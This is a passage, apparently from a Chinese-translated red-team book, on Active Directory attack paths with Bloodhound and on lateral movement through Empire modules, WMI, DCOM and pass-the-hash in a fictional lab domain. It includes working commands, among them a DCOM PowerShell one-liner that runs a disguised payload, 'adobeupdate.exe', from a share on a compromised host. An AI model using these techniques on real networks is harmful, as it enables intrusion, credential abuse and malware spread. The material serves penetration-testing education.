Change Password
Password: New Password
（4）在终端运行Bloodhound。
bloodhound
Database URL: bolt://127.0.0.1:7687
Username: neo4j
Password: New Password
（5）加载数据。
右侧有“Upload Data”按键。
上传acls.csv、group_membership.csv、local_admin.csv和sessions.csv文件。
如果您没有域环境进行测试，我上传了4个Bloodhound文件（见https://github.com/ cyberspacekittens/bloodhound），以便您可以重复练习。一旦进入Bloodhound并导入了所有数据，我们就可以选择查询，查看“Find Shorted Paths to Domain Admins.”。我们还可以选择特定用户，查看是否可以将路径映射到特定用户或组。在这个例子中，我们突破的第一个设备是PI:EMAIL。在搜索标签中，插入用户，单击“Pathfinding”按钮，然后输入“Domain Admin”（或任何其他用户），查看这些对象之间的规划路径，如图4.28所示。
图4.28
从Neil的机器上可以看出，我们可以一直迁移到CSK-Lab。进入实验设备，可以发现有一个名为Purri的用户，他是HelpDesk组的成员，如图4.29所示。
图4.29
如果可以突破HelpDesk组，我们可以迁移到Chris系统，发现Elon Muskkat最近登录过。如果可以迁移到他的进程或窃取他的明文密码，我们就可以升级为Domain Admin权限！
对于大型网络，我们注意到Bloodhound查询的限制和搜索问题。使用Neo4j的好处之一是允许通过Cypher语言进行原始查询。
我们可以添加哪些类型的自定义查询？@ porterhau5在扩展Bloodhound跟踪和可视化突破方面取得了一些重大进展。
从更高的层面来看，@porterhau5增加了突破主机标记，可以让攻击者更方便地在整个环境中进行迁移。例如，在假设的场景中，我们开展网络钓鱼攻击，获取第一个用户neil.pawstrong的信息。使用Bloodhound应用程序中的Cypher语言和Raw Query功能，我们可以进行以下查询。
将自有标记添加到突破系统。 
MATCH (n) WHERE n.name="NEIL.PAWSTRONG@CYBERSPACEKITTENS. LOCAL"SET n.owned="phish", n.wave=1
运行查询，显示所有已被网络钓鱼的系统。 
MATCH（n）WHERE n .owned ="phish"RETURN n
现在，我们可以向Bloodhound添加一些自定义查询。在Bloodhound的Queries选项卡中，滚动到底部，然后单击“Custom Queries”旁边的编辑按钮。然后，将所有文本替换为以下内容。
https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json
保存后，我们可以创建更多的查询。我们现在可以单击“Find Shortest Paths from owned node to Domain Admins”，如图4.30所示。
图4.30
如果您想更仔细地研究这个问题，可查看@ porterhau5的Bloodhound版本，它更加清晰地标记突破的计算机，并允许更多的自定义功能。
到目前为止，在没有扫描的情况下，我们已经能够获得有关该组织的大量信息，这都是本地活动目录用户（域用户）的权限，并且在大多数情况下，网络流量看起来很正常。如您所见，我们能够在不是本地管理员或不拥有本地系统任何管理权限的情况下完成所有这些操作。
高级ACL/ACE Bloodhound
当使用Bloodhound的Collection Method Access Control List（ACL）类型时，脚本将查询活动目录，搜集用户/对象的所有访问控制权限。我们从访问控制入口（ACES）搜集的信息描述了用户、组和计算机的允许和拒绝权限。查找和利用ACE本身就可以写一本完整的图书，下面是一些很好的学习资料。
BloodHound 1.3 - ACL攻击绘制配方。 
https://wald0.com/?p=112
介绍对手持续攻击方法。 
http://bit.ly/2GYU7S7
将ACL数据导入Bloodhound时，我们在寻找什么？Bloodhound识别ACE中可能存在弱点的区域，包括谁能够更改/重置密码、向组添加成员、为其他用户更新脚本路径、更新对象或在对象上写入新ACE等。
那么怎样利用这个功能？在突破设备并获得额外凭证时，我们可以查找路径，发现能够重置密码或修改ACE权限的用户。这将提出新的方法，查找域管理员或特权账户的路径，甚至是安装后门供后续行动使用。
4.8.4 横向移动——进程迁移
当主机存在多个用户时，通常的做法是生成令牌或在不同用户间迁移。这并不是什么新鲜事，但是多数是在一个环境内横向迁移。通常通过Bloodhound输出内容或共享工作站，作为攻击者，我们需要能够冒充被攻击者系统上的其他用户。
我们有很多工具可以实现上述功能。以Metasploit为例，我们都应该非常熟悉后陷身方法，可以实现令牌窃取。在Empire中，我们可以使用steal_tokens，冒充该系统上的用户。我注意到有时令牌劫持可能破坏自己的Shell。为了避免这种情况，我们可以在其他用户拥有的进程中，注入新代理。
在图4.31中，对运行恶意软件的员工，我们实施了网络钓鱼攻击。这允许我们在该被攻击者用户（neil.pawstrong）拥有的进程中运行。一旦进入该用户的主机，我们就迁移到Buzz Clawdrin系统，并使用WMI（Windows Management Instrumentation）生成一个新的代理。这里的问题是因为使用缓存凭证在Buzz的主机上生成Shell，所以我们仍然处于被攻击者neil.pawstrong的进程中。因此，我们应该使用Empire的psinject功能，而不是窃取令牌。
图4.31
Empire中的psinject具备的功能描述如下：“能够使用ReflectivePick将代理注入另一个进程，将.NET公共语言运行库加载到进程中，执行特定的PowerShell命令，所有这些都无须启动新的powershell.exe进程！”我们使用它来生成一个全新的代理，注入Buzz.Clawdrin进程中运行，这样我们就可以获得Buzz.Clawdrin的访问权限。
4.8.5 从您最初突破的主机开始横向移动
既然您已找到可能迁移的路径，有什么方式可以在这些系统实现代码的执行？基本的方法是使用当前活动目录用户的权限，获得对另一个系统的控制权。例如，一个经理具有访问其下属计算机的全部权限，在一个会议室/实验室的计算机上有多个用户具有管理员权限，内部系统配置错误，或者有人手动将用户添加到计算机本地管理员组，那么用户可以远程访问网络上其他工作站。在突破的计算机上，我们可以使用Bloodhound获取结果或者重新扫描网络，查找可以在本地访问的计算机。
Empire模块。
Metasploit模块。
Empire的find_localadmin_access模块向活动目录查询所有主机名，并尝试连接主机。这绝对是一个容易被检测的工具，因为它需要连接到每个主机并验证自己是否是本地管理员，如图4.32所示。
图4.32
我们可以看到，find_localadmin_access模块输出结果，确认突破的用户可以访问buzz.cyberspacekittens.local机器。这应该与运行Bloodhound的结果是一致的。为了仔细检查我们是否具有访问权限，我通常会执行非交互式远程命令，如dir \[remote system]\C$，并且查看对C驱动器是否具有读/写权限，如图4.33所示。
图4.33
在横向移动方面，有几种选项。让我们先来看看Empire等模块，因为它们是比较常见的（直接引用自Empire）。
inveigh_relay：Inveigh的SMB中继功能。这个模块可用于将传入的HTTP/代理NTLMv1/NTLMv2身份鉴权请求中继到SMB目标。如果身份鉴权成功且账户具有正确的权限，则在目标上以PSExec风格执行指定的命令或Empire启动程序。
invoke_executemsbuild：此函数使用MSBuild和内联任务在本地/远程主机上执行PowerShell命令。如果提供了凭证，则会在本地加载默认的管理员共享目录。此命令将在MSBuild.exe进程的上下文中执行，而无须启动PowerShell.exe。
invoke_psremoting：使用PSRemoting在远程主机上执行stager。只要被攻击者启用了PSRemoting（并非始终可用），我们就可以通过此服务执行PowerShell。
invoke_sqloscmd：使用xp_cmdshell在远程主机上执行命令或stager。'xp_cmdshell又回来了！
invoke_wmi：使用WMI在远程主机上执行stager。WMI几乎总是被启用，这是执行PowerShell静荷的好方法。
jenkins_script_console：将Empire代理部署到Windows Jenkins服务器中没有身份鉴权的脚本控制台。我们知道，Jenkins服务器通常没有启用鉴权，这意味着可以通过脚本实现远程代码执行。
invoke_dcom：通过DCOM上的MMC20.Application COM对象在远程主机上调用命令。允许我们在没有PsExec、WMI或PSRemoting的情况下进行迁移。
invoke_psexec：使用PsExec类型的功能在远程主机上执行stager。使用PsExec是一种老方法，复制文件并执行。这可能会引发警报，但如果没有其他方法可用的话，这仍然是一个很好的方法。
invoke_smbexec：使用SMBExec.ps在远程主机上执行stager。我们可以使用Samba工具进行类似的攻击，而不是使用PsExec。
invoke_sshcommand：通过SSH在远程主机上执行命令。
invoke_wmi_debugger：使用WMI将远程计算机上的目标二进制文件的调试器设置为cmd.exe或stager。使用sethc（粘滞键）等调试工具来执行我们的代理。
new_gpo_immediate_task：构建一个“立即”的schtask来推送指定的GPO。如果您的用户账户有权修改GPOS，则您可以推送一个“即时”计划任务GPO，这个编辑过的GPO生效后允许在系统中执行代码。
这些只是简单并且常用的横向移动技术。在本书的后续部分，我们将讨论一些新的方法突破目标。在大多数网络中，Windows Management Instrumentation（WMI）通常是启用的，因为WMI是管理工作站所必需的功能。因此，我们可以使用invoke_wmi横向移动。由于使用缓存凭证，并且账户可以访问远程主机，因此我们无须知道用户的凭证。
在远程系统上执行，如图4.34所示。
usemodule lateral_movement/invoke_wmi。
设置要攻击的计算机。 
set ComputerName buzz.cyberspacekittens.local
定义使用的监听器。 
set Listener http
远程连接到该主机并执行您的恶意软件。 
execute
与新代理交互。 
agents
interact 
sysinfo。
图4.34
4.8.6 使用DCOM横向移动
如果已经进入主机，那么有许多方法可以在主机上横向移动。如果突破的账户具有访问权限，或者您可以使用捕获的凭证创建令牌，那么我们可以使用WMI、PowerShell Remoting 或者 PsExec 等方法生成各种 Shell。如果这些方法被监控该怎么办？Windows 自带一些很不错的功能，我们可以利用其中的分布式组件对象模型（DCOM）功能。DCOM是Windows自带的功能，用于远程主机组件之间的通信。
您可以使用 PowerShell 命令 Get-CimInstance Win32_DCOMApplication 列出计算机的所有 DCOM 应用程序，如图 4.35 所示。
图4.35
根据@ enigma0x3的研究成果，他发现很多对象（如ShellBrowserWindow和ShellWindows）允许在被攻击者主机上远程执行代码。当列出所有的DCOM应用程序时，您将发现一个ShellBrowserWindow对象，其CLSID为C08AFD90-F2A1-11D1-8455- 00A0C91F3880。在发现这个对象后，只要账户允许访问，我们就可以利用这个功能在远程工作站上执行二进制文件。
powershell
$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","buzz.cyberspacekittens.local"))).Navigate ("c:\windows\system32\calc.exe")
这将在系统中执行本地可执行文件，并且不能在可执行文件中包含任何命令行参数（因此cmd/k样式的攻击不能执行）。当然，我们可以从远程系统调用文件并执行它们，但请注意，用户将弹出警告窗口。在这个例子中，我目前在被攻击者的主机neil.cyberspacekittens.local上，该主机具有buzz远程工作站的管理员访问权限。我们将在neil的工作站上共享一个文件夹，托管我们的恶意静荷。接下来，我们可以调用DCOM对象，在远程被攻击者（buzz）计算机上运行托管文件，如图4.36所示。
$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-
00A0C91F3880","buzz.cyberspacekittens.local"))).Navigate("\\neil.cyberspacekittens.local\Public\ adobeupdate.exe")
图4.36
如图4.37所示，buzz的机器上会弹出一个窗口，提示运行adobeupdate.exe文件。虽然大多数用户会单击并运行这个程序，但是也有可能攻击行为被发现。
图4.37
因此，避免被发现的方法是在DCOM执行文件之前，移动文件（类似于在被攻击者主机加载驱动器）。@ enigma0x3更进一步，使用Excel宏执行DCOM。首先，需要在自己的系统上创建恶意Excel文档，然后使用PowerShell脚本在被攻击主机上执行此XLS格式的文件。
需要注意的一点是，有许多其他DCOM对象可以从系统中获取信息、启动/停止服务等。这些资源肯定会为DCOM功能的其他研究提供很好的基础。
4.8.7 传递散列
本地管理员账户散列传递（PTH），虽然这种老的攻击方式在大部分场景中已经不起作用了，但是这种攻击方式并未彻底绝迹，我们快速回顾一下。散列传递攻击是指系统鉴权不使用用户的凭证，而是Windows NTLM散列进行身份验证。为什么这种攻击方式很重要？因为，散列可以使用Mimikatz这样的工具轻松恢复，可以从本地账户提取（但需要本地管理员访问权限），可以通过转储域控制器恢复（不是明文密码）以及其他方式。
散列传递攻击基本的用途是攻击本地管理员，但目前很难再发挥作用，因为默认情况下，本地管理员账户已被禁用，并且新的安全功能已开始应用，例如本地管理员密码解决方案（LAPS），它为每个工作站创建随机密码。在过去，在一个工作站上获取本地管理员账户的散列值，在整个组织中都是相同和适用的，这意味着突破一个工作站，就突破了整个公司。
当然，散列传递攻击发挥作用要求您必须是系统的本地管理员，即本地管理员账户“管理员”已启用，并且它是RID 500账户（这意味着必须是原始管理员账户，而不是新创建的本地管理员账户）。
Command: shell net user administrator
User name          Administrator
Full Name